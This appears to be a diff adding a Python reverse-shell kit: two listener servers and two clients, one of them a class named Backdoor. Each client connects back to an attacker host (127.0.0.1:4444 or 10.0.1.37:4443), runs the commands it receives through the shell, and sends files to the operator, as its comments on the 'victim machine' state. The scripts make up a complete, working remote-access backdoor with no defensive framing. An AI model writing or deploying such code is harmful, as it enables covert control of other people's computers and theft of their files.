@@ -1,0 +1,275 @@
+SERVER_1:
+
+import socket
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init(autoreset=True)
+
+# Server configuration
+HOST = "127.0.0.1"  # Replace with your server's IP address
+PORT = 4444  # Replace with your desired port
+
+# Print starting message
+print(Fore.GREEN + "Starting TCP Handler...")
+
+# Set up the server
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(5)
+
+# Wait for a connection
+print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
+client_socket, client_address = server.accept()
+print(Fore.GREEN + f"Connection established with {client_address}")
+
+try:
+    while True:
+        # Receive the prompt from the client
+        prompt = client_socket.recv(1024).decode("utf-8")
+        print(Fore.CYAN + prompt, end="")
+
+        # Get user input
+        command = input()
+
+        # Send the command to the client
+        client_socket.sendall(command.encode("utf-8"))
+
+        if command.lower() == "km":
+            print(Fore.RED + "Disconnecting from client...")
+            client_socket.close()
+            break
+
+        # Receive the output from the client
+        output = client_socket.recv(4096).decode("utf-8")
+        print(Fore.WHITE + output)
+
+except KeyboardInterrupt:
+    print(Fore.RED + "\nShutting down the server.")
+    client_socket.close()
+    server.close()
+
+SERVER_2:
+import socket
+import json
+import os
+import base64
+
+
+class Listener:
+
+    def __init__(self, ip, port):
+        l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # CREATES A SOCKET OBJECT.AF_INET STANDS FOR IPV4 AND SOCK_STREAM FOR TCP PACKET
+        l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # CHANGE OPTIONS OF SOCKET.HERE THE SOCKET IS MADE REUSABLE
+        l.bind((ip, port))  # LISTEN FOR INCOMING CONNECTIONS IN PORT 4444
+        l.listen(0)
+        print("[+] WAITING FOR CONNECTION [+]\n")
+        self.conn, addr = l.accept()  # ACCEPT THE CONNECTIONS
+        print("[+] GOT A CONNECTION FROM " + str(addr[0]) + " [+]\n")
+
+    def send_json(self, data):
+        json_data = json.dumps(data)  # CONVERT TCP STREAMS TO JSON DATA FOR RELIABLE TRANSFER FOR DATA
+        self.conn.send(json_data.encode())  # Encode to bytes before sending
+
+    def recieve_json(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.conn.recv(1024).decode()  # Decode bytes to string
+                return json.loads(json_data)  # IT SENDS THE FULL FILE TILL THE END OF THE STRING/DAT
+            except ValueError:
+                continue
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
+            file.write(base64.b64decode(content))
+            return "[+] Download successful [+]"
+
+    def read_file(self, path):  # RB FOR READABLE BINARY FILE
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()  # Decode bytes to string
+
+    def execute(self, command):
+        self.send_json(command)
+        if command[0] == "exit":
+            self.conn.close()
+            exit()
+        return self.recieve_json()
+
+    def run(self):
+        while True:
+            command = input(">")  # Use input for Python 3 instead of raw_input
+            command = command.split(" ")
+            try:
+                if command[0] == "upload":
+                    # HERE WE ARE SENDING A LIST OF ["UPLOAD", "SAMPLE.TXT", THE CONTENT INSIDE SAMPLE.TX]
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+                response = self.execute(command)
+                if command[0] == "download":
+                    response = self.write_file(command[1], response)
+            except Exception:
+                response = "[+] Error during executing the command [+] "
+            print(response)
+
+
+listener = Listener("10.0.1.37", 4443)
+listener.run()
+
+CLIENT_1:
+import socket
+import subprocess
+import os
+
+# Set up the target server and port (attacker's machine)
+HOST = "127.0.0.1"  # Replace with the attacker's IP address
+PORT = 4444  # Replace with the port the attacker is listening on
+
+# Function to execute commands on the target machine
+def execute_command(command):
+    # Execute the command and return the result
+    return subprocess.run(command, shell=True, capture_output=True)
+
+# Create a socket object to connect back to the attacker
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Attempt to connect to the attacker's server
+try:
+    sock.connect((HOST, PORT))
+
+    # Send an initial message to show the connection is established
+    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))
+
+    default_prompt = "admin@medusax~$ "
+    current_prompt = default_prompt
+    in_shell_mode = False  # Tracks whether the client is in shell mode
+
+    while True:
+        # Send the current prompt to the server
+        sock.sendall(current_prompt.encode("utf-8"))
+
+        # Receive the command from the server
+        command = sock.recv(1024).decode("utf-8").strip()
+
+        # Handle the 'km' command to completely disconnect
+        if command.lower() == "km":
+            sock.sendall("Disconnecting...\n".encode("utf-8"))
+            sock.close()
+            break
+
+        # Handle the 'shell' command to enter the shell mode
+        if command.lower() == "shell":
+            # Switch to the C:\ directory
+            try:
+                os.chdir("C:\\")
+                in_shell_mode = True  # Enable shell mode
+                current_prompt = f"{os.getcwd()} > "
+                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
+            except Exception as e:
+                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
+            continue
+
+        # Handle the 'shell -d <directory>' command to set a specific directory
+        if command.startswith("shell -d"):
+            try:
+                _, _, directory = command.partition("-d")
+                directory = directory.strip()
+                os.chdir(directory)  # Change to the specified directory
+                in_shell_mode = True  # Enable shell mode
+                current_prompt = f"{os.getcwd()} > "
+                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
+            except Exception as e:
+                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
+            continue
+
+        # If in shell mode, process shell commands
+        if in_shell_mode:
+            if command.lower() == "exit":
+                # Exit the shell and return to the default prompt
+                in_shell_mode = False  # Disable shell mode
+                current_prompt = default_prompt
+                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
+                continue
+
+            # Execute the received shell command
+            output = execute_command(command)
+            sock.sendall(output.stdout + output.stderr)
+            continue
+
+        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
+        sock.sendall("Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.\n".encode("utf-8"))
+
+except Exception as e:
+    print(f"Error: {e}")
+    sock.close()
+
+CLIENT_2:
+import socket
+import subprocess
+import json
+import os
+import base64
+
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # CREATES A SOCKET OBJECT.AF_INET STANDS FOR IPV4 AND SOCK_STREAM FOR TCP PACKET
+        self.s.connect((ip, port))  # CONNECTION ESTABLISHMENT(3 WAY HANDSHAKE)
+
+    def execute(self, command):
+        try:
+            return subprocess.check_output(command, shell=True, text=True)  # RETURNS THE OUTPUT OF SYSTEM COMMAND EXECUTED IN VICTIM MACHINE
+        except subprocess.CalledProcessError:
+            return "[+] Invalid command [+]"
+
+    def send_json(self, data):
+        json_data = json.dumps(data)  # CONVERT TCP STREAMS TO JSON DATA FOR RELIABLE TRANSFER FOR DATA
+        self.s.send(json_data.encode())  # Encode to bytes before sending
+
+    def recieve_json(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.s.recv(1024).decode()  # Decode bytes to string
+                return json.loads(json_data)  # IT SENDS THE FULL FILE TILL THE END OF THE STRING/DAT
+            except ValueError:
+                continue
+
+    def change_dir(self, path):
+        try:
+            os.chdir(path)
+        except OSError:
+            return "Invalid path"
+        return "Changed directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as file:  # RB FOR READABLE BINRAY FILE
+            return base64.b64encode(file.read()).decode()  # Decode bytes to string
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful [+]"
+
+    def run(self):
+        while True:
+            command = self.recieve_json()  # TRANFERING DATA IN CHUNKS.1024 IS THE BUFFER SIZE
+            try:
+                if command[0] == "exit":
+                    self.s.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_output = self.change_dir(command[1])
+                elif command[0] == "download":
+                    command_output = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_output = self.write_file(command[1], command[2])
+                else:
+                    command_output = self.execute(command)  # CALLING THE FUNCTION WHICH RETURNS OUTPUT OF SYSTEM COMMAND
+            except Exception:
+                command_output = "[+] Error during execution of the command [+] "
+            self.send_json(command_output)  # SENDS BACK THE OUTPUT TO LISTENER MACHINE
+
+
+backdoor = Backdoor("10.0.1.37", 4443)
+backdoor.run()
